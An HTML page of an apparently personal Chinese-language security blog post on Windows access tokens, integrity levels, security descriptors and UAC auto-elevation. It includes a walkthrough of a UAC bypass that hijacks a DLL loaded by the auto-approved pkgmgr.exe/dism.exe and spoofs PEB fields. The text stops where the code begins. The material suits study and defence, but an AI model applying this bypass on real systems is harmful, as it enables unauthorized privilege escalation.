<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="windows权限管理Access Token在内核中，是一个名为 _TOKEN 的结构体。 核心成员包括： UserAndGroups (SID列表)123456&#x2F;&#x2F;0x10 bytes (sizeof)struct _SID_AND_ATTRIBUTES&#123;    VOID* Sid;">
<meta property="og:type" content="article">
<meta property="og:title" content="windows 学习（六）-- 权限管理">
<meta property="og:url" content="https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/index.html">
<meta property="og:site_name" content="wooo~ Exploooosion&#39;s blog">
<meta property="og:description" content="windows权限管理Access Token在内核中，是一个名为 _TOKEN 的结构体。 核心成员包括： UserAndGroups (SID列表)123456&#x2F;&#x2F;0x10 bytes (sizeof)struct _SID_AND_ATTRIBUTES&#123;    VOID* Sid;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-30-learning_windows_4/1770548058630.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-30-learning_windows_4/1770622797128.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-30-learning_windows_4/1770622919005.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-30-learning_windows_4/1770623080528.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-08-learning_windows_6/1770637949454.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-08-learning_windows_6/1770637159312.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-08-learning_windows_6/1770637290822.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-08-learning_windows_6/1770637587826.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-08-learning_windows_6/1770638446474.png">
<meta property="article:published_time" content="2026-02-07T16:00:00.000Z">
<meta property="article:modified_time" content="2026-02-09T12:01:45.328Z">
<meta property="article:author" content="Exploooosion">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://exploo0osion.github.io/image/2025-12-30-learning_windows_4/1770548058630.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>windows 学习（六）-- 权限管理</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 8.1.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2026/02/06/2026-02-06-malware_analysis_1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&text=windows 学习（六）-- 权限管理"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&is_video=false&description=windows 学习（六）-- 权限管理"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=windows 学习（六）-- 权限管理&body=Check out this article: https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&title=windows 学习（六）-- 权限管理"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&name=windows 学习（六）-- 权限管理&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2026/02/08/2026-02-08-learning_windows_6/&t=windows 学习（六）-- 权限管理"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows"><span class="toc-number">1.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">权限管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-Token"><span class="toc-number">1.1.1.</span> <span class="toc-text">Access Token</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UserAndGroups-SID%E5%88%97%E8%A1%A8"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">UserAndGroups (SID列表)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Privileges-%E7%89%B9%E6%9D%83%E4%BD%8D%E5%9B%BE"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Privileges (特权位图)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IntegrityLevelIndex-%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A7%E5%88%AB"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">IntegrityLevelIndex (完整性级别)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrustLinkedToken%EF%BC%88%E9%93%BE%E6%8E%A5%E4%BB%A4%E7%89%8C%EF%BC%89"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">TrustLinkedToken（链接令牌）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Descriptor"><span class="toc-number">1.1.2.</span> <span class="toc-text">Security Descriptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Account-Control"><span class="toc-number">1.1.3.</span> <span class="toc-text">User Account Control</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UAC%E6%8F%90%E6%9D%83%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">UAC提权机制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E5%AE%89%E5%85%A8%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text">路径安全校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text">身份与配置校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.1.3.</span> <span class="toc-text">签名校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%AD%96%E7%95%A5%E9%99%90%E5%88%B6"><span class="toc-number">1.1.3.1.4.</span> <span class="toc-text">注册表策略限制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-UAC"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">Bypass UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81UAC%E7%99%BD%E5%90%8D%E5%8D%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.3.2.1.</span> <span class="toc-text">dll劫持UAC白名单程序</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.2.1.1.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#EQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.3.2.1.2.</span> <span class="toc-text">EQL基本语法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.2.1.3.</span> <span class="toc-text">检测方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%AF%A1%E6%94%B9pe%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91"><span class="toc-number">1.1.3.2.2.</span> <span class="toc-text">通过注册表篡改pe执行逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.3.2.2.1.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.3.2.2.2.</span> <span class="toc-text">检测方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#com%E7%BB%84%E4%BB%B6ICMLuaUtil%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.3.2.3.</span> <span class="toc-text">com组件ICMLuaUtil提权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.1.3.2.3.1.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.1.3.2.3.2.</span> <span class="toc-text">检测方法</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        windows 学习（六）-- 权限管理
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Exploooosion</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2026-02-07T16:00:00.000Z" class="dt-published" itemprop="datePublished">2026-02-08</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/windows/">windows</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <span id="more"></span>

<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h3><p>在内核中，是一个名为 <code>_TOKEN</code> 的结构体。</p>
<p>核心成员包括：</p>
<h4 id="UserAndGroups-SID列表"><a href="#UserAndGroups-SID列表" class="headerlink" title="UserAndGroups (SID列表)"></a>UserAndGroups (SID列表)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VOID* Sid;                                                              <span class="comment">//0x0</span></span><br><span class="line">    ULONG Attributes;                                                       <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>User SID: S-1-5-21-2352286992-1005746632-3940334147-1000</p>
<p>S-1-5：标准开头（NT Authority）。</p>
<p>21-…：域&#x2F;机器的唯一 ID（Machine SID）。</p>
<p>1000 (RID)：相对 ID，普通用户通常从 1000 开始。</p>
<table>
<thead>
<tr>
<th>500</th>
<th>Administrator</th>
<th>默认管理员（本地）</th>
</tr>
</thead>
<tbody><tr>
<td>501</td>
<td>Guest</td>
<td>来宾账户</td>
</tr>
<tr>
<td>502</td>
<td>KRBTGT</td>
<td>Kerberos 服务账户（域）</td>
</tr>
<tr>
<td>512</td>
<td>Domain Admins</td>
<td>域管理员组（域）</td>
</tr>
<tr>
<td>513</td>
<td>Domain Users</td>
<td>域用户组</td>
</tr>
<tr>
<td>544</td>
<td>Administrators</td>
<td>管理员组</td>
</tr>
<tr>
<td>545</td>
<td>Users</td>
<td>普通用户组</td>
</tr>
<tr>
<td>1000+</td>
<td>普通用户&#x2F;组</td>
<td>本地创建的用户从 1000 或 1001 开始递增</td>
</tr>
</tbody></table>
<p>Group SIDs: 用户所属组（Administrators, Users, Everyone 等）。</p>
<p>每个组都有一个属性（Attributes）。</p>
<ul>
<li>Enabled ：正常的有效组。</li>
<li>UseForDenyOnly ：在“过滤令牌”（Medium 权限）中，管理员组（S-1-5-32-544）会被标记为这个属性。意味着：这个组不能帮你通过“允许”检查，但如果 ACL 里有针对这个组的“拒绝”项，依然生效。</li>
</ul>
<h4 id="Privileges-特权位图"><a href="#Privileges-特权位图" class="headerlink" title="Privileges (特权位图)"></a>Privileges (特权位图)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x18 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SEP_TOKEN_PRIVILEGES</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONGLONG Present;      	  	<span class="comment">//0x0</span></span><br><span class="line">    ULONGLONG Enabled;       		<span class="comment">//0x8</span></span><br><span class="line">    ULONGLONG EnabledByDefault;		<span class="comment">//0x10</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>其中Present代表可用权限,，如 <code>SeDebugPrivilege</code>（调试权）、<code>SeShutdownPrivilege</code>（关机权），Enabled代表可用权限中开启了的部分，二者的每一个bit位代表着一个权限，对于system进程其两者字段都是 <code>0x0000001ff2ffffbc</code></p>
<p>通常特权默认存在但是是 <code>Disabled</code>的，你需要调用 <code>AdjustTokenPrivileges</code>去开启它。而 UAC 过滤后的令牌是直接把敏感特权从列表中移除了。</p>
<h4 id="IntegrityLevelIndex-完整性级别"><a href="#IntegrityLevelIndex-完整性级别" class="headerlink" title="IntegrityLevelIndex (完整性级别)"></a>IntegrityLevelIndex (完整性级别)</h4><p>强制访问控制（Mandatory Integrity Control）。防止低权限进程（如浏览器）篡改高权限进程或系统文件。它是 UAC 和沙箱的核心。</p>
<ul>
<li>S-1-16-4096(Low): 沙箱、IE 保护模式。</li>
<li>S-1-16-8192 (Medium): 标准用户、UAC 过滤后的管理员（默认桌面进程）。</li>
<li>S-1-16-12288(High): “以管理员身份运行”的进程。</li>
<li>S-1-16-16384(System): 系统服务。</li>
</ul>
<h4 id="TrustLinkedToken（链接令牌）"><a href="#TrustLinkedToken（链接令牌）" class="headerlink" title="TrustLinkedToken（链接令牌）"></a>TrustLinkedToken（链接令牌）</h4><p>如果是过滤令牌，这个字段指向你那个被封印的 High (完整令牌)。当用右键“以管理员运行”时，系统就是顺着这个链子找到 High Token 并用来创建新进程的。</p>
<h3 id="Security-Descriptor"><a href="#Security-Descriptor" class="headerlink" title="Security Descriptor"></a>Security Descriptor</h3><p>任何内核对象（文件、互斥体、注册表、进程对象本身）头部都挂着这个结构体。它定义了谁可以访问它，以及允许或拒绝哪些操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x28 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR Revision;                                                         <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Sbz1;                                                             <span class="comment">//0x1</span></span><br><span class="line">    USHORT Control;                                                         <span class="comment">//0x2</span></span><br><span class="line">    VOID* Owner;                                                            <span class="comment">//0x8</span></span><br><span class="line">    VOID* Group;                                                            <span class="comment">//0x10</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span>* <span class="title">Sacl</span>;</span>                                                      <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span>* <span class="title">Dacl</span>;</span>                                                      <span class="comment">//0x20</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>Owner: 对象所有者的用户或组 SID</p>
<p>DACL (Discretionary ACL): 定义谁可以&#x2F;不可以对对象执行哪些操作</p>
<p>SACL (System ACL): 定义哪些访问行为需要被审计（记录到安全日志）</p>
<p>Windows 在DACL检查之前，先进行完整性级别检查（Mandatory Integrity Control (MIC) 机制）：</p>
<table>
<thead>
<tr>
<th>请求者 IL</th>
<th>目标对象 IL</th>
<th>默认允许的操作</th>
</tr>
</thead>
<tbody><tr>
<td>Low</td>
<td>Medium</td>
<td>读、执行 （受限）</td>
</tr>
<tr>
<td>Low</td>
<td>High</td>
<td>无 （完全隔离）</td>
</tr>
<tr>
<td>Medium</td>
<td>High</td>
<td>读（部分场景），禁止写&#x2F;注入</td>
</tr>
<tr>
<td>High</td>
<td>System</td>
<td>通常禁止</td>
</tr>
</tbody></table>
<ul>
<li>低完整性进程不能向高完整性进程发送窗口消息 （UIPI）例如模拟点击“确定”绕过 UAC</li>
<li>低完整性进程不能写入高完整性文件&#x2F;注册表</li>
<li>低完整性进程不能打开高完整性进程的 HANDLE（如 PROCESS_VM_WRITE）</li>
</ul>
<h3 id="User-Account-Control"><a href="#User-Account-Control" class="headerlink" title="User Account Control"></a>User Account Control</h3><p>当一个属于 Administrators 组的用户登录时， LSA （Local Security Authority）会创建  两个访问令牌 ：</p>
<table>
<thead>
<tr>
<th>令牌类型</th>
<th>权限特点</th>
<th>完整性级别</th>
<th>所属组</th>
</tr>
</thead>
<tbody><tr>
<td>Standard User Token（过滤令牌）</td>
<td>移除了高危特权（如 <code>SeDebugPrivilege</code>），禁用 Administrators 组 SID</td>
<td>Medium</td>
<td>Users + 其他非管理员组</td>
</tr>
<tr>
<td>Elevated Token（完整令牌）</td>
<td>包含全部特权和 Administrators SID</td>
<td>High</td>
<td>Administrators + Users + 所有组</td>
</tr>
</tbody></table>
<h4 id="UAC提权机制"><a href="#UAC提权机制" class="headerlink" title="UAC提权机制"></a>UAC提权机制</h4><p><a target="_blank" rel="noopener" href="https://minhangxiaohui.github.io/2024/09/19/UAC%E6%B5%81%E7%A8%8B%E5%8F%8A%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">UAC流程及提权原理分析 - ga0weI Blog</a></p>
<p>根据上面博主的分析，得到以下结果：</p>
<p>UAC 提权并非由当前用户进程（Client）直接完成，而是通过 RPC 请求系统服务（Server）代为执行。</p>
<ul>
<li><strong>发起端</strong> ：<code>explorer.exe</code> 或其他用户进程（Medium Integrity）。</li>
<li><strong>服务端</strong> <strong>：</strong><code>AppInfo</code> 服务（Application Information Service），宿主于 <code>svchost.exe</code>，拥有 System 权限。</li>
<li><strong>核心函数</strong> <strong>：</strong><code>AppInfo</code>服务中的 <code>RAiLaunchAdminProcess</code> 负责处理提权请求 。</li>
</ul>
<p>自动提权判定逻辑（决定是否弹出安全桌面弹窗）</p>
<p>系统会调用 <code>AiIsEXESafeToAutoApprove</code>函数进行判定 ，只有同时满足以下三个维度的条件，程序才能静默自动提权</p>
<h5 id="路径安全校验"><a href="#路径安全校验" class="headerlink" title="路径安全校验"></a>路径安全校验</h5><p>对可执行文件的位置进行”先黑后白”的过滤。</p>
<ul>
<li><p>程序路径不能包含以下目录（即使在 Windows 目录下）：</p>
<ul>
<li><code>\Windows\Debug</code></li>
<li><code>\Windows\PCHealth</code></li>
<li><code>\Windows\Registration</code></li>
<li><code>\Windows\System32\com</code></li>
<li><code>\Windows\System32\Spool</code></li>
<li><code>\Windows\System32\Tasks</code></li>
<li><code>\Windows\SysWow64\com</code></li>
<li>…等</li>
</ul>
</li>
<li><p>程序路径必须位于以下受信任目录之一：</p>
<ul>
<li><code>\Windows\System32</code>(及其下的 PE 文件)</li>
<li><code>\Windows\SysWOW64</code></li>
<li><code>\Windows\ehome</code></li>
<li><code>\Windows\ImmersiveControlPanel</code></li>
</ul>
</li>
<li><p>特定的系统部署工具也被允许，例如：</p>
<ul>
<li><code>\Windows\System32\Sysprep\sysprep.exe</code></li>
<li><code>\Windows\System32\inetsrv\InetMgr.exe</code></li>
</ul>
</li>
</ul>
<h5 id="身份与配置校验"><a href="#身份与配置校验" class="headerlink" title="身份与配置校验"></a>身份与配置校验</h5><p>程序必须满足以下任一条件以证明其提权意图的合法性：</p>
<p>Manifest 标记 ：可执行文件的 Manifest 中必须包含 <code>autoElevate</code>元素且值为 <code>true</code>。</p>
<p>白名单列表：程序必须存在于 <code>g_lpAutoApproveEXEList</code> 列表中（如 <code>pkgmgr.exe</code>等系统工具）。</p>
<p><img src="/image/2025-12-30-learning_windows_4/1770548058630.png" alt="1770548058630"></p>
<h5 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h5><p>数字签名：系统会调用 <code>WTGetSignatureInfo</code>校验 PE 文件的数字签名，通常要求必须由 Microsoft 签名。</p>
<p>文件名一致性 ：校验文件的 <code>OriginalFilename</code>属性是否与当前文件名一致，防止文件名篡改 。</p>
<h5 id="注册表策略限制"><a href="#注册表策略限制" class="headerlink" title="注册表策略限制"></a>注册表策略限制</h5><p>注册表配置会影响上述判定的生效：</p>
<p>自动审批开关 ：<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</code>下的 <code>EnableRestrictedAutoApprove</code> 键值决定是否开启受限自动审批。</p>
<p>强制签名校验 ：同路径下的 <code>ValidateAdminCodeSignatures</code>键值若开启，则强制要求管理员代码必须经过签名校验。</p>
<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><h5 id="dll劫持UAC白名单程序"><a href="#dll劫持UAC白名单程序" class="headerlink" title="dll劫持UAC白名单程序"></a>dll劫持UAC白名单程序</h5><h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p>通过利用 <code>IFileOperation</code> COM 接口往高权限目录（system32\syswow）写dll文件，dllHijack劫持windows内置的能够不弹窗自提权的exe，从而实现提权；</p>
<p>当com组件调用时，会通过下面四个区域判别调用者是否是其受信的调用者，因此可以修改以下四个区域为可信程序如（explorer.exe、rundll32.exe等微软信任程序）</p>
<ul>
<li>Peb-&gt;ProcessParameters-&gt;ImagePathName</li>
<li>Peb-&gt;ProcessParameters-&gt;CommandLine</li>
<li>PEB-&gt;Ldr-&gt;FullDllName</li>
<li>PEB-&gt;Ldr-&gt;BaseDllName；</li>
</ul>
<p>该方式利用uac校验流程 <code>AilsEXESafeToAutoApprove</code>里面的 <code>g_lpAutoApproveEXEList</code>白名单中的pkgmgr.exe ，绕过uac弹窗</p>
<p>运行命令 <code>pkgmgr /iu:TelnetClient</code> ，为windows安装telnet，通过ProcessMonitor发现其加载dism.exe</p>
<p><img src="/image/2025-12-30-learning_windows_4/1770622797128.png" alt="1770622797128"></p>
<p>dism.exe加载的dll如下，根据dll加载的优先级，我们可以将dll注入到system32的目录</p>
<p><img src="/image/2025-12-30-learning_windows_4/1770622919005.png" alt="1770622919005"></p>
<p>具体代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 